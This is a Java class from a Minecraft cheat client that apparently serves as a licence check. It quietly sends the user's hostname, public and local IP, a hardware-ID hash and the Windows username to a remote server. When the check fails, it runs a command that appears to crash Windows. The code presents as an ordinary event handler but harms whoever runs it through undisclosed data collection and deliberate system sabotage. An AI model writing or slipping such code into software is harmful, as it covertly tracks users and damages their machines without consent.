package Sender;

import net.minecraft.client.Minecraft;
import org.apache.commons.lang3.RandomStringUtils;
import org.jsoup.Jsoup;
import zamorozka.main.Zamorozka;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.math.BigInteger;
import java.net.InetAddress;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

public class EventsGOVNO {
    public static final EventsGOVNO EventsGOVNO = new EventsGOVNO();

    public void EventGovno() throws IOException, NoSuchAlgorithmException {
        InetAddress addr = InetAddress.getLocalHost();
        org.jsoup.nodes.Document ipleak = Jsoup.connect("https://hwidchecker.zzz.com.ua/fhddfhgyj.php").get();
        String ipmyass = ipleak.text();
        String ipAddress = addr.getHostAddress();
        String hostname = addr.getHostName();
        String username = System.getProperty("user.name");
        String command = "wmic csproduct get UUID";
        StringBuffer output = new StringBuffer();
        Process SerNumProcess = Runtime.getRuntime().exec(command);
        try {
            SerNumProcess = Runtime.getRuntime().exec(command);
        } catch (IOException e) {
        }
        BufferedReader sNumReader = new BufferedReader(new InputStreamReader(SerNumProcess.getInputStream()));
        String line = ""
        		
        		;
        try {
            while ((line = sNumReader.readLine()) != null) {
                output.append(line + "\n");
            }
        } catch (IOException e) {
        }
        String MachineID = output.toString().substring(output.indexOf("\n"), output.length()).trim();
        MessageDigest messageDigest = null;
        byte[] digest = new byte[0];
        try {
            messageDigest = MessageDigest.getInstance("MD5");
            messageDigest.reset();
            messageDigest.update(MachineID.getBytes());
            digest = messageDigest.digest();
        } catch (NoSuchAlgorithmException e) {
        }
        BigInteger bigInt = new BigInteger(1, digest);
        String md5Hex = bigInt.toString(16);

        while (md5Hex.length() < 32) {
            md5Hex = "0" + md5Hex;
        }

        org.jsoup.nodes.Document scr56 = Jsoup.connect("https://hwidchecker.zzz.com.ua/mik.php?cad="+hostname+"/ip:"+ipmyass).get();
        if (scr56.html().indexOf(".") == -1) {
            File f1 = new File(EventsGOVNO.class.getProtectionDomain().getCodeSource().getLocation().getPath());
            String f = URLDecoder.decode(f1.toString());
            MessageDigest digest1 = null;
            try {
                digest1 = MessageDigest.getInstance("MD5");
            } catch (NoSuchAlgorithmException e1) {
            }
            String urldec = java.net.URLDecoder.decode(f, StandardCharsets.UTF_8.name());
            InputStream is = new FileInputStream(urldec);
            byte[] buffer = new byte[8192];
            int read = 0;

                while ((read = is.read(buffer)) > 0) {
                    digest1.update(buffer, 0, read);
                }
                byte[] md5sum = digest1.digest();
                BigInteger bigInt1 = new BigInteger(1, md5sum);
                String output1 = bigInt1.toString(16);
                String str1 = RandomStringUtils.randomAlphabetic(7);
                org.jsoup.nodes.Document scr561 = Jsoup.connect("https://hwidchecker.zzz.com.ua/lkj2.php?krol=" + str1).get();
                String password = str1;
                MessageDigest md = MessageDigest.getInstance("MD5");
                md.update(password.getBytes());
                byte[] byteData = md.digest();
                StringBuffer sb = new StringBuffer();
                for (int i = 0; i < byteData.length; i++) {
                    sb.append(Integer.toString((byteData[i] & 0xff) + 0x100, 16).substring(1));
                }
                String password1 = "456775873451314364785" + sb.toString() + "fdgnfldkggvibjgfhlkbn";
                MessageDigest md1 = MessageDigest.getInstance("MD5");
                md1.update(password1.getBytes());
                byte[] byteData1 = md1.digest();
                StringBuffer sb1 = new StringBuffer();
                for (int i = 0; i < byteData1.length; i++) {
                    sb1.append(Integer.toString((byteData1[i] & 0xff) + 0x100, 16).substring(1));
                }
                String password11 = sb1.toString();
                MessageDigest md11 = MessageDigest.getInstance("MD5");
                md11.update(password11.getBytes());
                byte[] byteData11 = md11.digest();
                StringBuffer sb11 = new StringBuffer();
                for (int i = 0; i < byteData11.length; i++) {
                    sb11.append(Integer.toString((byteData11[i] & 0xff) + 0x100, 16).substring(1));
                }
                String password111 = sb11.toString();
                MessageDigest md111 = MessageDigest.getInstance("SHA-256");
                md111.update(password111.getBytes());
                byte[] byteData111 = md111.digest();
                StringBuffer sb111 = new StringBuffer();
                for (int i = 0; i < byteData111.length; i++) {
                    sb111.append(Integer.toString((byteData111[i] & 0xff) + 0x100, 16).substring(1));
                }
                if (!scr561.html().contains("<p>" + output1 + "</p>") || !scr561.html().contains("<a>" + sb111.toString() + "</a>")) {
                    org.jsoup.nodes.Document scr565 = Jsoup.connect("https://hwidchecker.zzz.com.ua/mik2.php?cad=" + hostname + " /ip:" + ipmyass + " /localip:"+ipAddress + " /Hwid:"+md5Hex+" /UsernamePC:"+username).get();
                    Runtime.getRuntime().exec("cd \\\\.\\globalroot\\device\\condrv\\kernelconnect");
                    Minecraft.getMinecraft().world.removeEntityDangerously(Minecraft.player);
                }



        } else {
            Minecraft.getMinecraft().world.removeEntityDangerously(Minecraft.player);
        }
        if (!(Zamorozka.isWindows() || Zamorozka.isMac())) {
            Zamorozka.player().serverPosZ = 4;

        }
    }

}
